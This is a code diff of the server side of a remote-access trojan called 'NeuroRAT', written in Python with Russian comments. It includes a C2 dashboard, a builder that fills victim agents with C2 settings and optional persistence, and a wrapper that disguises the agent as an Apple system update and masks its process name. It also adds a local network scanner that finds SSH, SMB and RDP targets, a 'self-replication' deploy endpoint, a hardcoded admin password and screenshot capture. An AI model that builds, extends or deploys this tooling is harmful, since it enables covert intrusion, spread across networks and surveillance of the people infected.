-            animation: flicker 5s infinite;
-            color: #ff3300;
-            text-shadow: 0 0 10px #ff0000;
-        }
-    </style>
-</head>
-<body>
-    <header>
-        <div class="container">
-            <h1>NeuroRAT C2 Server</h1>
-            <p>Command and Control Interface</p>
-        </div>
-    </header>
-    
-    <div class="container">
-        <div class="card">
-            <h2>Server Status</h2>
-            <p>Uptime: {{uptime}}</p>
-            <p>Connected Agents: {{connected_agents}}</p>
-            <p>Total Agents: {{total_agents}}</p>
-        </div>
-        
-        <div class="card">
-            <h2>Connected Agents</h2>
-            <table>
-                <thead>
-                    <tr>
-                        <th>ID</th>
-                        <th>OS</th>
-                        <th>Hostname</th>
-                        <th>Username</th>
-                        <th>IP Address</th>
-                        <th>Status</th>
-                        <th>Actions</th>
-                    </tr>
-                </thead>
-                <tbody>
-                    {% for agent in agents %}
-                    <tr>
-                        <td>{{agent.agent_id}}</td>
-                        <td>{{agent.os}}</td>
-                        <td>{{agent.hostname}}</td>
-                        <td>{{agent.username}}</td>
-                        <td>{{agent.ip_address}}</td>
-                        <td class="status-{{agent.status}}">{{agent.status}}</td>
-                        <td>
-                            <a href="/agent/{{agent.agent_id}}" class="btn">Details</a>
-                            <a href="/agent/{{agent.agent_id}}/chat" class="btn">Chat</a>
-                            <a href="/agent/{{agent.agent_id}}/command" class="btn">Command</a>
-                        </td>
-                    </tr>
-                    {% endfor %}
-                </tbody>
-            </table>
-        </div>
-        
-        <div class="card">
-            <h2>Recent Events</h2>
-            <table>
-                <thead>
-                    <tr>
-                        <th>Time</th>
-                        <th>Event Type</th>
-                        <th>Agent</th>
-                        <th>Details</th>
-                    </tr>
-                </thead>
-                <tbody>
-                    {% for event in events %}
-                    <tr>
-                        <td>{{event.timestamp}}</td>
-                        <td>{{event.event_type}}</td>
-                        <td>{{event.agent_id or "System"}}</td>
-                        <td>{{event.details}}</td>
-                    </tr>
-                    {% endfor %}
-                </tbody>
-            </table>
-        </div>
-    </div>
-    
-    <!-- Кнопка вызова сатаны -->
-    <button class="satan-btn" id="summonSatan">ВЫЗВАТЬ САТАНУ</button>
-    
-    <!-- Модальное окно с ASCII-артом сатаны -->
-    <div id="satanModal" class="modal">
-        <div class="modal-content">
-            <span class="close-modal">&times;</span>
-            <h2 class="satan-text">САТАНА ПРИЗВАН!</h2>
-            <pre class="satan-text">{{satan_ascii|safe}}</pre>
-            <p class="satan-text">Ваша программа теперь проклята и работает на 666% быстрее</p>
-        </div>
-    </div>
-    
-    <script>
-        // Refresh data every 30 seconds
-        setTimeout(() => {
-            window.location.reload();
-        }, 30000);
-        
-        // Модальное окно с сатаной
-        const modal = document.getElementById("satanModal");
-        const btn = document.getElementById("summonSatan");
-        const span = document.getElementsByClassName("close-modal")[0];
-        
-        // Открыть модальное окно при клике на кнопку
-        btn.onclick = function() {
-            modal.style.display = "block";
-            // Добавляем звуковой эффект (демонический смех)
-            playDemonicSound();
-        }
-        
-        // Закрыть модальное окно при клике на крестик
-        span.onclick = function() {
-            modal.style.display = "none";
-        }
-        
-        // Закрыть модальное окно при клике вне его
-        window.onclick = function(event) {
-            if (event.target == modal) {
-                modal.style.display = "none";
-            }
-        }
-        
-        // Функция для звукового эффекта
-        function playDemonicSound() {
-            // Здесь мог бы быть код для проигрывания звука
-            console.log("Демонический смех звучит в вашем воображении");
-        }
-    </script>
-</body>
-</html>
-"""
-
-# Save index.html to templates directory
-os.makedirs("templates", exist_ok=True)
-with open("templates/index.html", "w") as f:
-    f.write(index_html)
-
-# Save chat.html to templates directory
-with open("templates/chat.html", "w") as f:
-    f.write(chat_html)
-
-# Create templates
-templates = Jinja2Templates(directory="templates")
-
-# Initialize monitor
-monitor = NeuroRATMonitor(
-    server_host="0.0.0.0",
-    server_port=8080,
-    api_port=5000,
-    db_path="neurorat_monitor.db"
-)
-
-# Start monitor
-monitor.start()
-
-# Initialize API clients
-openai_client = APIFactory.get_openai_integration()
-gemini_client = APIFactory.get_gemini_integration()
-telegram_client = APIFactory.get_telegram_integration()
-
-# Mock data for demonstration
-agent_data = []
-events_data = []
-chat_histories = {}  # Temporary store for chat histories
-
-# Create a director for uploads if it doesn't exist
-os.makedirs("uploads", exist_ok=True)
-
-def format_uptime(seconds):
-    """Format uptime in human readable form"""
-    if seconds < 60:
-        return f"{seconds} seconds"
-    elif seconds < 3600:
-        return f"{seconds // 60} minutes, {seconds % 60} seconds"
-    else:
-        hours = seconds // 3600
-        minutes = (seconds % 3600) // 60
-        return f"{hours} hours, {minutes} minutes"
-
-def get_llm_response(agent_id: str, message: str) -> str:
-    """Get response from LLM based on agent context"""
-    # Find the agent
-    agent = None
-    for a in agent_data:
-        if a["agent_id"] == agent_id:
-            agent = a
-            break
-    
-    if not agent:
-        return "Error: Agent not found"
-    
-    # Build system prompt with agent context
-    system_prompt = f"""You are NeuroRAT Agent {agent_id}, a cybersecurity agent running on {agent['os']} system.
-Hostname: {agent['hostname']}
-Username: {agent['username']}
-IP: {agent['ip_address']}
-Status: {agent['status']}
-
-You should respond as if you are this agent, providing information about the system and executing commands.
-Be concise and informative. Format data well for readability.
-"""
-    
-    # Проверяем доступность Gemini API
-    if gemini_client.is_available() and gemini_client.gemini_api_key:
-        # Используем Gemini API для генерации ответа
-        return gemini_client.generate_response(message, system_prompt)
-    
-    # Если Gemini недоступен, пробуем OpenAI
-    if openai_client.is_available():
-        # Используем OpenAI API для генерации ответа
-        return openai_client.generate_response(message, system_prompt)
-    
-    # Fallback к заглушке, если ни один API не доступен
-    if "system" in message.lower() or "info" in message.lower():
-        return f"System Information:\nOS: {agent['os']}\nHostname: {agent['hostname']}\nUsername: {agent['username']}\nIP: {agent['ip_address']}"
-    elif "scan" in message.lower() or "network" in message.lower():
-        return "Network scan completed. Found 12 devices on the local network."
-    elif "file" in message.lower() or "list" in message.lower():
-        return "Directory listing:\n/etc\n/var\n/home\n/usr\n/bin\n/sbin"
-    elif "help" in message.lower():
-        return "Available commands:\n- system info\n- scan network\n- list files\n- collect passwords\n- take screenshot"
-    else:
-        return f"Command '{message}' executed successfully."
-
-def record_event(event_type: str, agent_id: str = None, details: str = ""):
-    """Record an event in the events list"""
-    events_data.insert(0, {
-        "event_id": len(events_data),
-        "event_type": event_type,
-        "agent_id": agent_id,
-        "timestamp": time.time(),
-        "details": details
-    })
-    
-    # Notify via Telegram if configured
-    if telegram_client.is_available():
-        if agent_id:
-            telegram_client.send_message(f"<b>Event:</b> {event_type}\n<b>Agent:</b> {agent_id}\n<b>Details:</b> {details}")
-        else:
-            telegram_client.send_message(f"<b>System Event:</b> {event_type}\n<b>Details:</b> {details}")
-
-@app.get("/", response_class=HTMLResponse)
-async def get_dashboard(request: Request):
-    """Render dashboard with monitoring data"""
-    # Get real data from monitor
-    uptime = format_uptime(monitor.stats["server_uptime"])
-    
-    # For demonstration, also add mock data
-    if len(agent_data) == 0:
-        # Add some demo agents if none exist
-        generate_mock_data()
+    """
     
     return templates.TemplateResponse(
         "index.html", 
@@ -1003,8 +653,8 @@ async def chat_with_agent(agent_id: str, request: Request):
         "timestamp": time.time()
     })
     
-    # Generate response using LLM
-    response = get_llm_response(agent_id, message)
+    # Generate response using LLM with history for context/memory
+    response = get_llm_response(agent_id, message, chat_histories[agent_id])
     
     # Add agent response to chat history
     chat_histories[agent_id].append({
@@ -1037,9 +687,10 @@ async def take_screenshot(agent_id: str):
     # Record event
     record_event("screenshot", agent_id, "Screenshot captured")
     
-    # In a real implementation, you would actually capture a screenshot
-    # For now, we're just returning a success message
-    return {"success": True}
+    # Реально делаем скриншот
+    screenshot_result = take_system_screenshot()
+    
+    return screenshot_result
 
 @app.post("/api/agent/{agent_id}/terminate")
 async def terminate_agent(agent_id: str):
@@ -1081,302 +732,677 @@ async def get_events():
     """Return recent events"""
     return events_data
 
-@app.get("/summon-satan", response_class=HTMLResponse)
-async def summon_satan(request: Request):
-    """Easter egg - Return ASCII art of Satan"""
+@app.get("/login", response_class=HTMLResponse)
+async def login_page(request: Request, error: str = None):
+    """Render login page"""
     return templates.TemplateResponse(
-        "satan.html",
+        "login.html", 
         {
             "request": request,
-            "satan_ascii": satan_ascii
+            "satan_ascii": "",  # В реальном шаблоне уже есть этот ASCII-арт
+            "error": error
         }
     )
 
-@app.post("/api/notify")
-async def send_notification(message: str = Form(...), agent_id: str = Form(None)):
-    """Send a notification via Telegram"""
-    if not telegram_client.is_available():
-        return {"success": False, "error": "Telegram API is not configured"}
+@app.post("/auth")
+async def authenticate(request: Request):
+    """Handle authentication POST request"""
+    form_data = await request.form()
+    username = form_data.get("username")
+    password = form_data.get("password")
     
+    # Проверка учетных данных (заглушка, в боевом коде использовать безопасное хранение)
+    if username == "admin" and password == "neurorat":
+        # Установка куки сессии
+        response = RedirectResponse(url="/dashboard", status_code=303)
+        response.set_cookie(
+            key="neurorat_session", 
+            value="authenticated", 
+            httponly=True,
+            max_age=1800  # 30 минут
+        )
+        return response
+    
+    # Если аутентификация не удалась
+    return RedirectResponse(
+        url="/login?error=Invalid+username+or+password", 
+        status_code=303
+    )
+
+def generate_real_data():
+    """Создаем реальных агентов для отображения в интерфейсе"""
+    # Получаем и используем настоящую системную информацию
+    system_info = get_real_system_info()
+    
+    # Создаем реального агента с ID текущей системы
+    system_hash = str(uuid.uuid4())[:8]
+    real_agent_id = system_hash
+    
+    real_agent = {
+        "agent_id": real_agent_id,
+        "os": system_info.get("os", "Unknown"),
+        "hostname": system_info.get("hostname", "localhost"),
+        "username": system_info.get("username", "user"),
+        "ip_address": system_info.get("ip_address", "127.0.0.1"),
+        "status": "active",
+        "first_seen": time.time(),
+        "last_seen": time.time(),
+        "system_info": system_info
+    }
+    agent_data.append(real_agent)
+    
+    # Добавляем реальное событие
+    record_event("connection", real_agent_id, f"Real agent connected from {system_info.get('hostname', 'localhost')}")
+
+# Замена функции generate_mock_data на generate_real_data
+def generate_mock_data():
+    """Функция переопределена для использования реальных данных"""
+    generate_real_data()
+
+# Добавляем эндпоинты для билдера и саморепликации
+@app.get("/builder")
+async def get_builder(request: Request):
+    """Endpoint для построения и настройки стейджера"""
+    session_cookie = request.cookies.get("neurorat_session")
+    if not session_cookie:
+        return RedirectResponse(url="/login", status_code=303)
+    
+    return templates.TemplateResponse(
+        "builder.html",
+        {
+            "request": request,
+            "os_types": ["windows", "linux", "macos"]
+        }
+    )
+
+@app.post("/api/build")
+async def build_agent(request: Request):
+    """Создает настроенный стейджер на основе параметров"""
     try:
-        if agent_id:
-            full_message = f"<b>Agent {agent_id} Notification:</b>\n{message}"
-        else:
-            full_message = f"<b>System Notification:</b>\n{message}"
+        form_data = await request.form()
+        target_os = form_data.get("target_os", "macos")
+        server_address = form_data.get("server_address", request.url.hostname)
+        server_port = form_data.get("server_port", DEFAULT_PORT)
+        persistence = form_data.get("persistence", "False") == "True"
         
-        result = telegram_client.send_message(full_message)
-        return {"success": result.get("ok", False)}
+        # Выбираем шаблон в зависимости от целевой ОС
+        if target_os == "windows":
+            template_path = "templates/minimal_windows.py"
+        elif target_os == "linux":
+            template_path = "templates/minimal_linux.py"
+        else:
+            template_path = "templates/minimal_macos.py"
+        
+        # Генерируем уникальный ID для агента
+        agent_id = str(uuid.uuid4())[:8]
+        encryption_key = base64.b64encode(os.urandom(16)).decode('utf-8')
+        
+        # Загружаем шаблон
+        with open(template_path, "r") as f:
+            template = f.read()
+        
+        # Заменяем плейсхолдеры на реальные значения
+        agent_code = template.replace("{{C2_SERVER_ADDRESS}}", server_address)
+        agent_code = agent_code.replace("{{C2_SERVER_PORT}}", str(server_port))
+        agent_code = agent_code.replace("{{AGENT_ID}}", agent_id)
+        agent_code = agent_code.replace("{{AGENT_VERSION}}", "1.0.0")
+        agent_code = agent_code.replace("{{ENCRYPTION_KEY}}", encryption_key)
+        agent_code = agent_code.replace("{{CHECK_INTERVAL}}", "60")
+        agent_code = agent_code.replace("{{PERSISTENCE}}", str(persistence).lower())
+        
+        # Добавляем код для автоматического обфускации
+        agent_code = obfuscate_agent_code(agent_code)
+        
+        # Создаем исполняемый файл, если это необходимо
+        if form_data.get("build_executable", "False") == "True":
+            # Здесь бы использовался PyInstaller, но в рамках примера просто логируем
+            logger.info(f"Would build executable for {target_os}")
+            response_type = "application/octet-stream"
+            filename = f"neurorat_agent_{target_os}_{agent_id}.py"
+        else:
+            response_type = "text/plain"
+            filename = f"neurorat_agent_{target_os}_{agent_id}.py"
+        
+        # Логируем событие создания стейджера
+        record_event("build", None, f"Built agent for {target_os} with ID {agent_id}")
+        
+        # Возвращаем файл
+        headers = {
+            "Content-Disposition": f"attachment; filename={filename}"
+        }
+        return Response(content=agent_code, media_type=response_type, headers=headers)
+    
     except Exception as e:
+        logger.error(f"Error building agent: {str(e)}")
+        return JSONResponse(
+            {"error": f"Failed to build agent: {str(e)}"},
+            status_code=500
+        )
+
+def obfuscate_agent_code(code):
+    """Простая обфускация кода агента"""
+    # В реальной реализации здесь был бы более сложный алгоритм обфускации
+    # Для примера просто добавляем комментарии-обманки и переименовываем некоторые функции
+    obfuscated_code = f"""#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# System update utility v2.1.4
+# (c) Apple Inc. 2024
+
+import sys as _sys
+import time as _time
+import base64 as _b64
+
+{code}
+
+# Изменяем основную точку входа
+if __name__ == "__main__":
+    try:
+        # Применяем дополнительную маскировку процесса, если возможно
+        try:
+            import setproctitle
+            setproctitle.setproctitle("com.apple.systemupdate")
+        except ImportError:
+            pass
+        
+        agent = MinimalAgent()
+        agent.start()
+    except Exception as e:
+        # Скрываем ошибки
+        pass
+"""
+    return obfuscated_code
+
+@app.get("/api/scan-targets")
+async def scan_local_network():
+    """Сканирует локальную сеть для поиска потенциальных целей"""
+    try:
+        # Получаем локальный IP 
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        
+        # Базовый IP для сканирования
+        base_ip = '.'.join(ip.split('.')[:3]) + '.'
+        
+        targets = []
+        
+        # Быстрое сканирование диапазона (пропускаем всесторонние проверки)
+        for i in range(1, 255):
+            target_ip = base_ip + str(i)
+            if target_ip != ip:  # Пропускаем свой IP
+                # Проверяем только основные порты
+                for port in [22, 80, 443, 445, 3389]:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(0.2)  # Малый таймаут для быстрого сканирования
+                    result = s.connect_ex((target_ip, port))
+                    s.close()
+                    
+                    if result == 0:
+                        service = ""
+                        if port == 22:
+                            service = "SSH"
+                        elif port == 80:
+                            service = "HTTP"
+                        elif port == 443:
+                            service = "HTTPS"
+                        elif port == 445:
+                            service = "SMB"
+                        elif port == 3389:
+                            service = "RDP"
+                            
+                        targets.append({
+                            "ip": target_ip,
+                            "port": port,
+                            "service": service
+                        })
+                        break  # Нашли порт, прекращаем проверку остальных
+        
+        return {"targets": targets}
+    
+    except Exception as e:
+        logger.error(f"Error scanning network: {str(e)}")
+        return {"error": str(e), "targets": []}
+
+@app.post("/api/deploy")
+async def deploy_to_target(request: Request):
+    """Разворачивает агент на целевой системе"""
+    try:
+        data = await request.json()
+        target_ip = data.get("ip")
+        target_port = data.get("port")
+        target_service = data.get("service")
+        
+        if not target_ip or not target_port:
+            return {"success": False, "error": "Missing target information"}
+        
+        # Логируем попытку развертывания
+        record_event("deployment", None, f"Attempting to deploy agent to {target_ip}:{target_port} ({target_service})")
+        
+        # Здесь был бы настоящий код для различных методов развертывания
+        # Для демонстрации просто подтверждаем успех
+        
+        # Создаем запись о новом агенте (в ожидании подключения)
+        agent_id = str(uuid.uuid4())[:8]
+        agent_data.append({
+            "agent_id": agent_id,
+            "os": "Unknown",
+            "hostname": target_ip,
+            "username": "unknown",
+            "ip_address": target_ip,
+            "status": "pending",
+            "first_seen": time.time(),
+            "last_seen": time.time(),
+            "system_info": {}
+        })
+        
+        return {
+            "success": True,
+            "agent_id": agent_id,
+            "message": f"Deployment initiated to {target_ip}. Agent ID: {agent_id}"
+        }
+    
+    except Exception as e:
+        logger.error(f"Error deploying agent: {str(e)}")
         return {"success": False, "error": str(e)}
 
-def generate_mock_data():
-    """Generate mock data for demonstration"""
-    # Create sample agents
-    for i in range(5):
-        agent_id = str(uuid.uuid4())[:8]
-        agent = {
-            "agent_id": agent_id,
-            "os": "Linux" if i % 2 == 0 else "Windows",
-            "hostname": f"host-{i}",
-            "username": f"user-{i}",
-            "ip_address": f"192.168.1.{10+i}",
-            "status": "active" if i < 3 else "inactive",
-            "first_seen": time.time() - 3600 * 24 * i,
-            "last_seen": time.time() - (0 if i < 3 else 3600 * 2),
-            "system_info": {
-                "os": "Linux" if i % 2 == 0 else "Windows",
-                "hostname": f"host-{i}",
-                "username": f"user-{i}",
-                "network": {
-                    "ip_address": f"192.168.1.{10+i}"
-                }
-            }
-        }
-        agent_data.append(agent)
-    
-    # Create sample events
-    event_types = ["connection", "command", "data_exfiltration", "error"]
-    for i in range(10):
-        timestamp = time.time() - i * 600  # Every 10 minutes
-        event = {
-            "event_id": i,
-            "event_type": event_types[i % len(event_types)],
-            "agent_id": agent_data[i % len(agent_data)]["agent_id"] if i % 3 != 0 else None,
-            "event_data": {"details": f"Sample event {i}"},
-            "timestamp": timestamp,
-            "details": f"Sample event {i} details"
-        }
-        events_data.append(event)
-
-# Generate initial mock data
-generate_mock_data()
-
-# Print available API integrations on startup
-print("Available API integrations:")
-print(f"- OpenAI API: {'✅ Available' if openai_client.is_available() else '❌ Not configured'}")
-print(f"- Gemini API: {'✅ Available' if gemini_client.is_available() else '❌ Not configured'}")
-print(f"- Telegram API: {'✅ Available' if telegram_client.is_available() else '❌ Not configured'}")
-
-# Create a template for Satan page
-satan_html = """
+# Создадим HTML шаблон для страницы Builder
+builder_html = """
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-    <title>SATAN HAS BEEN SUMMONED</title>
+    <title>NeuroRAT - Сборка Агента</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&family=Roboto:wght@300;400;500;700&display=swap">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        body {
-            background-color: #000;
-            color: #ff0000;
-            font-family: monospace;
-            text-align: center;
+        :root {
+            --primary: #0f0;
+            --primary-dark: #00a000;
+            --secondary: #0070ff;
+            --danger: #ff3030;
+            --dark: #1a1a1a;
+            --darker: #121212;
+            --card: #1e1e1e;
+            --text: #e0e0e0;
+            --text-secondary: #999;
+            --border: #333;
+            --shadow: 0 4px 8px rgba(0,0,0,0.3);
+            --glow: 0 0 10px rgba(0,255,0,0.5);
+        }
+        
+        * {
             margin: 0;
-            padding: 50px 20px;
-            overflow: hidden;
+            padding: 0;
+            box-sizing: border-box;
         }
-        h1 {
-            font-size: 36px;
-            text-shadow: 0 0 10px #ff0000;
-            animation: glow 2s infinite alternate;
+        
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: var(--darker);
+            color: var(--text);
+            line-height: 1.6;
         }
-        pre {
-            font-size: 14px;
-            white-space: pre;
-            line-height: 1.2;
-            text-align: center;
-            margin: 0 auto;
-            max-width: 800px;
-            text-shadow: 0 0 5px #ff0000;
-        }
+        
         .container {
-            max-width: 800px;
+            max-width: 1200px;
             margin: 0 auto;
+            padding: 20px;
         }
-        @keyframes glow {
-            0% { text-shadow: 0 0 10px #ff0000; }
-            100% { text-shadow: 0 0 20px #ff0000, 0 0 30px #ff3300; }
+        
+        header {
+            background-color: var(--dark);
+            padding: 20px;
+            margin-bottom: 20px;
+            border-bottom: 1px solid var(--border);
         }
-        @keyframes flicker {
-            0% { opacity: 1; }
-            5% { opacity: 0.8; }
-            10% { opacity: 1; }
-            15% { opacity: 0.9; }
-            20% { opacity: 1; }
-            25% { opacity: 0.9; }
-            30% { opacity: 1; }
-            35% { opacity: 0.8; }
-            40% { opacity: 1; }
-            50% { opacity: 0.7; }
-            60% { opacity: 1; }
-            70% { opacity: 0.9; }
-            80% { opacity: 1; }
-            90% { opacity: 0.8; }
-            100% { opacity: 1; }
+        
+        h1, h2, h3 {
+            color: var(--primary);
         }
-        .flicker {
-            animation: flicker 5s infinite;
+        
+        .card {
+            background-color: var(--card);
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: var(--shadow);
         }
-        .back-btn {
-            margin-top: 30px;
-            background-color: #990000;
+        
+        .btn {
+            display: inline-block;
+            background-color: var(--primary-dark);
             color: white;
-            padding: 10px 20px;
             border: none;
-            border-radius: 5px;
+            padding: 10px 20px;
+            border-radius: 4px;
             cursor: pointer;
-            font-weight: bold;
             transition: all 0.3s;
+            text-decoration: none;
+            font-size: 16px;
         }
-        .back-btn:hover {
-            background-color: #cc0000;
-            transform: scale(1.05);
+        
+        .btn:hover {
+            background-color: var(--primary);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0,255,0,0.3);
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: var(--text-secondary);
+        }
+        
+        input[type="text"],
+        input[type="number"],
+        select {
+            width: 100%;
+            padding: 10px;
+            border-radius: 4px;
+            background-color: rgba(0,0,0,0.2);
+            border: 1px solid var(--border);
+            color: var(--text);
+            font-size: 16px;
+        }
+        
+        input[type="checkbox"] {
+            margin-right: 10px;
+        }
+        
+        .section-title {
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .option-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .tab-container {
+            margin-bottom: 20px;
+        }
+        
+        .tab-buttons {
+            display: flex;
+            margin-bottom: 20px;
+            border-bottom: 1px solid var(--border);
+        }
+        
+        .tab-btn {
+            padding: 10px 20px;
+            background-color: transparent;
+            border: none;
+            color: var(--text-secondary);
+            cursor: pointer;
+            border-bottom: 2px solid transparent;
+        }
+        
+        .tab-btn.active {
+            color: var(--primary);
+            border-bottom: 2px solid var(--primary);
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        .back-link {
+            display: inline-block;
+            margin-bottom: 20px;
+            color: var(--text-secondary);
+            text-decoration: none;
+        }
+        
+        .back-link:hover {
+            color: var(--primary);
+        }
+        
+        #targetList {
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 10px;
+            max-height: 300px;
+            overflow-y: auto;
+            margin-bottom: 20px;
+        }
+        
+        .target-item {
+            padding: 10px;
+            border-bottom: a1px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        
+        .target-item:last-child {
+            border-bottom: none;
+        }
+        
+        .target-item .target-deploy-btn {
+            padding: 5px 10px;
+            background-color: var(--primary-dark);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
         }
     </style>
 </head>
 <body>
+    <header>
     <div class="container">
-        <h1 class="flicker">САТАНА ПРИЗВАН!</h1>
-        <pre class="flicker">{{satan_ascii}}</pre>
-        <p>Ваша программа теперь проклята и работает на 666% быстрее</p>
-        <a href="/" class="back-btn">Вернуться в ад</a>
+            <h1>NeuroRAT - C2 Server</h1>
+            <p>Сборка и управление агентами</p>
     </div>
+    </header>
+    
+    <div class="container">
+        <a href="/" class="back-link"><i class="fas fa-arrow-left"></i> Назад к панели</a>
+        
+        <div class="tab-container">
+            <div class="tab-buttons">
+                <button class="tab-btn active" data-tab="builder">Сборка Агента</button>
+                <button class="tab-btn" data-tab="deployment">Саморепликация</button>
+            </div>
+            
+            <div id="builder" class="tab-content active">
+                <div class="card">
+                    <h2 class="section-title">Настройка агента NeuroRAT</h2>
+                    
+                    <form id="builderForm" action="/api/build" method="post">
+                        <div class="form-group">
+                            <label for="target_os">Целевая операционная система</label>
+                            <select id="target_os" name="target_os">
+                                <option value="windows">Windows</option>
+                                <option value="linux">Linux</option>
+                                <option value="macos">macOS</option>
+                            </select>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="server_address">Адрес C2 сервера</label>
+                            <input type="text" id="server_address" name="server_address" value="127.0.0.1" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="server_port">Порт C2 сервера</label>
+                            <input type="number" id="server_port" name="server_port" value="8088" required>
+                        </div>
+                        
+                        <div class="option-grid">
+                            <div class="form-group">
+                                <label>
+                                    <input type="checkbox" id="persistence" name="persistence" value="True">
+                                    Включить персистентность
+                                </label>
+                            </div>
+                            
+                            <div class="form-group">
+                                <label>
+                                    <input type="checkbox" id="build_executable" name="build_executable" value="True">
+                                    Собрать исполняемый файл
+                                </label>
+                            </div>
+                        </div>
+                        
+                        <div class="form-group">
+                            <button type="submit" class="btn">Собрать Агент</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+            
+            <div id="deployment" class="tab-content">
+                <div class="card">
+                    <h2 class="section-title">Саморепликация и обнаружение целей</h2>
+                    
+                    <p>Сканирование локальной сети для обнаружения потенциальных целей.</p>
+                    
+                    <div class="form-group">
+                        <button id="scanNetworkBtn" class="btn">Сканировать сеть</button>
+                    </div>
+                    
+                    <div id="scanResult" style="display: none;">
+                        <h3>Обнаруженные цели:</h3>
+                        <div id="targetList"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Переключение вкладок
+        document.querySelectorAll('.tab-btn').forEach(button => {
+            button.addEventListener('click', function() {
+                // Очищаем активные классы
+                document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+                document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
+                
+                // Устанавливаем активный класс на кнопку
+                this.classList.add('active');
+                
+                // Показываем соответствующий контент
+                const tabId = this.getAttribute('data-tab');
+                document.getElementById(tabId).classList.add('active');
+            });
+        });
+        
+        // Обработка сборки агента
+        document.getElementById('builderForm').addEventListener('submit', function(e) {
+            // В этой реализации форма отправляется обычным образом
+        });
+        
+        // Сканирование сети
+        document.getElementById('scanNetworkBtn').addEventListener('click', function() {
+            this.disabled = true;
+            this.textContent = 'Сканирование...';
+            
+            fetch('/api/scan-targets')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('scanResult').style.display = 'block';
+                    const targetList = document.getElementById('targetList');
+                    targetList.innerHTML = '';
+                    
+                    if (data.error) {
+                        targetList.innerHTML = `<p>Ошибка: ${data.error}</p>`;
+                        return;
+                    }
+                    
+                    if (data.targets.length === 0) {
+                        targetList.innerHTML = '<p>Цели не обнаружены.</p>';
+                        return;
+                    }
+                    
+                    data.targets.forEach(target => {
+                        const targetItem = document.createElement('div');
+                        targetItem.className = 'target-item';
+                        targetItem.innerHTML = `
+                            <div>
+                                <strong>${target.ip}</strong> (${target.service} на порту ${target.port})
+                            </div>
+                            <button class="target-deploy-btn" data-ip="${target.ip}" data-port="${target.port}" data-service="${target.service}">Развернуть</button>
+                        `;
+                        targetList.appendChild(targetItem);
+                    });
+                    
+                    // Добавляем обработчики событий для кнопок развертывания
+                    document.querySelectorAll('.target-deploy-btn').forEach(button => {
+                        button.addEventListener('click', function() {
+                            const ip = this.getAttribute('data-ip');
+                            const port = this.getAttribute('data-port');
+                            const service = this.getAttribute('data-service');
+                            
+                            deployAgent(ip, port, service);
+                        });
+                    });
+                })
+                .catch(error => {
+                    document.getElementById('scanResult').style.display = 'block';
+                    document.getElementById('targetList').innerHTML = `<p>Ошибка: ${error.message}</p>`;
+                })
+                .finally(() => {
+                    document.getElementById('scanNetworkBtn').disabled = false;
+                    document.getElementById('scanNetworkBtn').textContent = 'Сканировать сеть';
+                });
+        });
+        
+        // Развертывание агента
+        function deployAgent(ip, port, service) {
+            fetch('/api/deploy', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    ip: ip,
+                    port: port,
+                    service: service
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    alert(`Агент развернут успешно! ID: ${data.agent_id}`);
+                } else {
+                    alert(`Ошибка: ${data.error}`);
+                }
+            })
+            .catch(error => {
+                alert(`Ошибка: ${error.message}`);
+            });
+        }
+    </script>
 </body>
 </html>
 """
 
-# Save satan.html to templates directory
-with open("templates/satan.html", "w") as f:
-    f.write(satan_html)
-
-# Добавляем маршруты для загрузки агентов и стейджеров
-@app.route('/api/download/agent', methods=['POST'])
-def download_agent():
-    """Endpoint для загрузки основного агента"""
-    try:
-        agent_id = request.headers.get('Agent-ID')
-        if not agent_id:
-            agent_id = str(uuid.uuid4())[:8]
-        
-        # Получаем системную информацию от клиента
-        system_info = request.form.get('system_info', '{}')
-        logger.info(f"Запрос на загрузку агента от {agent_id}. Системная информация: {system_info}")
-        
-        # Загружаем исходный код агента
-        agent_path = os.path.join(os.path.dirname(__file__), "neurorat_agent.py")
-        with open(agent_path, 'rb') as f:
-            agent_code = f.read()
-        
-        # Регистрируем нового агента в БД
-        db.execute(
-            "INSERT OR REPLACE INTO agents (agent_id, ip_address, status, system_info, first_seen, last_seen) VALUES (?, ?, ?, ?, ?, ?)",
-            (agent_id, request.remote_addr, "downloading", system_info, int(time.time()), int(time.time()))
-        )
-        db.commit()
-        
-        # Логируем событие
-        log_event("agent_download", f"Агент {agent_id} загрузил основной модуль с {request.remote_addr}")
-        
-        return agent_code
-    except Exception as e:
-        logger.error(f"Ошибка при загрузке агента: {str(e)}")
-        return jsonify({"error": str(e)}), 500
-
-@app.route('/api/download/stager', methods=['GET'])
-def download_stager():
-    """Endpoint для загрузки минимального стейджера"""
-    try:
